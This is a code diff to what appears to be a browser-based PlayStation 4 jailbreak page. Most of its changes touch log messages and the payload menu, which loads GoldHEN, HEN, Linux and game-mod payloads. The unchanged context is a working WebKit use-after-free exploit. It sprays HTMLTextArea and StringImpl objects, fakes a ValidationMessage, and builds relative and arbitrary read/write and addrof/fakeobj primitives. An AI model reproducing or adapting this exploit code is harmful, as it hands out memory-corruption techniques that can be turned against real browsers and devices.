@@ -37,13 +37,13 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("-> Succesfully got a relative R/W");
+			debug_log("--> Succesfully got a relative R/W");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
-	debug_log("-> Setting up arbitrary R/W");
+	debug_log("--> Setting up arbitrary R/W");
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
 	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -65,12 +65,12 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
-	debug_log("-> Testing arbitrary R/W");
+	debug_log("[+] Testing arbitrary R/W");
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
-	debug_log("-> Succesfully got arbitrary R/W!");
+	debug_log("--> Succesfully got arbitrary R/W!");
 	write64(guess_htmltextarea_addr, saved_vtable);
 	cleanup();
 	g_ab_slave.leakme = 0x1337;
@@ -80,7 +80,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("->Exploit Complete....!!");
+	debug_log("-> Exploit Complete..Run Jailbreak !!");
 	if(window.postExploit)
 		window.postExploit();
 }
@@ -89,25 +89,14 @@ function toggle_payload(pld){
 		document.getElementById("progress").innerHTML="Running Jailbreak.. Please wait!!";
 		preloadScripts(['jb.js']);
 	}else if(pld == "goldhen"){
-		document.getElementById("progress").innerHTML="Loading GoldHenv1.0.. Please wait..";
-		if(fw=="755"){
-			preloadScripts(['preloader.js', 'goldhen'+fw+'.js', 'loader.js']);
-	}else{
-			preloadScripts(['preloader'+fw+'.js', 'goldhen'+fw+'.js', 'loader.js']);	
-		}
-	}else if(pld == "goldhenold"){
 		document.getElementById("progress").innerHTML="Loading GoldHenv1.1.. Please wait..";
-		if(fw=="755"){
-			preloadScripts(['preloader.js', 'goldhen1v'+fw+'.js', 'loader.js']);
-	}else{
-			preloadScripts(['preloader'+fw+'.js', 'goldhen1v'+fw+'.js', 'loader.js']);	
-		}
-	}else if(pld == "hen213b"){
-		document.getElementById("progress").innerHTML="Loading Hen v2.1.3b ... Please wait..";
-		preloadScripts(['preloaderx.js', 'hen213b.js', 'loader.js']);
-	}else if(pld == "Toolbox"){
+		preloadScripts(['preloader.js', 'goldhen.js', 'loader.js']);	
+	}else if(pld == "goldhenold"){
+		document.getElementById("progress").innerHTML="Loading GoldHenv1.0.. Please wait..";
+		preloadScripts(['preloader.js', 'goldhenold.js', 'loader.js']);	
+	}else if(pld == "toolbox"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
-		preloadScripts(['preloader.js', 'toolbox.js', 'loader.js']);
+		preloadScripts(['preloader.js', 'Toolbox755.js', 'loader.js']);			
 	}else if(pld == "backup"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'backup.js', 'loader.js']);
@@ -141,10 +130,10 @@ function toggle_payload(pld){
 	}else if(pld == "rifrenamer"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'rifrenamer.js', 'loader.js']);
-	}else if(pld == "linuxl1gb"){
+	}else if(pld == "linux1gb"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'linuxl1gb.js', 'loader.js']);
-	}else if(pld == "linuxl3gb"){
+	}else if(pld == "linux3gb"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'linuxl3gb.js', 'loader.js']);
 	}else if(pld == "kernelclock"){
@@ -162,6 +151,9 @@ function toggle_payload(pld){
 	}else if(pld == "webrte"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'webrte.js', 'loader.js']);
+	}else if(pld == "fan"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['preloader.js', 'fanThreshold.js', 'loader.js']);
 	}else if(pld == "ArabicGuy100"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'gtava1.js', 'loader.js']);
@@ -173,7 +165,7 @@ function toggle_payload(pld){
 		preloadScripts(['preloader.js', 'gtava3.js', 'loader.js']);
 	}else if(pld == "Lamance"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
-		preloadScripts(['preloader.js', 'gtavl.js', 'loader.js']);	
+		preloadScripts(['preloader.js', 'gtavl.js', 'loader.js']);
 	}else if(pld == "rd2113"){
 		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
 		preloadScripts(['preloader.js', 'red113.js', 'loader.js']);
@@ -247,11 +239,11 @@ function confuseTargetObjRound2() {
 	setTimeout(setupRW, 6000);
 }
 function leakJSC() {
-	debug_log("-> Looking for the smashed StringImpl...");
+	debug_log("--> Looking for the smashed StringImpl...");
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("-> StringImpl corrupted successfully");
+			debug_log("--> StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -259,7 +251,7 @@ function leakJSC() {
 	}
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
-	debug_log("-> Got a relative read");
+	debug_log("--> Got a relative read");
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
                 tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
@@ -311,7 +303,7 @@ function leakJSC() {
 			}
 		}
 	}
-	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
+	debug_log("--> JSArrayBufferView: " + g_jsview_leak);
 	prepareUAF();
 }
 function confuseTargetObjRound1() {
@@ -320,7 +312,7 @@ function confuseTargetObjRound1() {
 		die("[!] Failed to reuse target obj.");
 	dumpTargetObj();
 	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
-	setTimeout(function(){leakJSC();}, 6000);
+	setTimeout(leakJSC, 6000);
 }
 function handle2() {
 	input2.focus();
@@ -332,8 +324,8 @@ function reuseTargetObj() {
 	for (let i = 0; i < NB_REUSE; i++) {
 		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
 		let view = new Float64Array(ab);
-		view[0] = guess_htmltextarea_addr.asDouble();   
-		view[3] = guess_htmltextarea_addr.asDouble();   
+		view[0] = guess_htmltextarea_addr.asDouble();    
+		view[3] = guess_htmltextarea_addr.asDouble();    
 		g_arr_ab_1.push(view);
 	}
 	if (g_round == 1) {
@@ -347,14 +339,14 @@ function reuseTargetObj() {
 	}
 }
 function dumpTargetObj() {
-	debug_log("-> m_timer: " + g_timer_leak);
-	debug_log("-> m_messageHeading: " + g_message_heading_leak);
-	debug_log("-> m_messageBody: " + g_message_body_leak);
+	debug_log("--> m_timer: " + g_timer_leak);
+	debug_log("--> m_messageHeading: " + g_message_heading_leak);
+	debug_log("--> m_messageBody: " + g_message_body_leak);
 }
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("-> Found fake ValidationMessage");
+			debug_log("--> Found fake ValidationMessage");
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
@@ -387,7 +379,7 @@ function prepareUAF() {
 	g_input.autofocus = true;
 }
 function sprayHTMLTextArea() {
-	debug_log("-> Spraying HTMLTextareaElement ...");
+	debug_log("--> Spraying HTMLTextareaElement ...");
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
@@ -403,11 +395,9 @@ function sprayStringImpl(start, end) {
 	}
 }
 function go() {
-		if(localStorage.is75XCached){
 		sprayHTMLTextArea();
 		if(window.midExploit)
 			window.midExploit();
 		g_input = input1;
 		prepareUAF();
-	}
 }
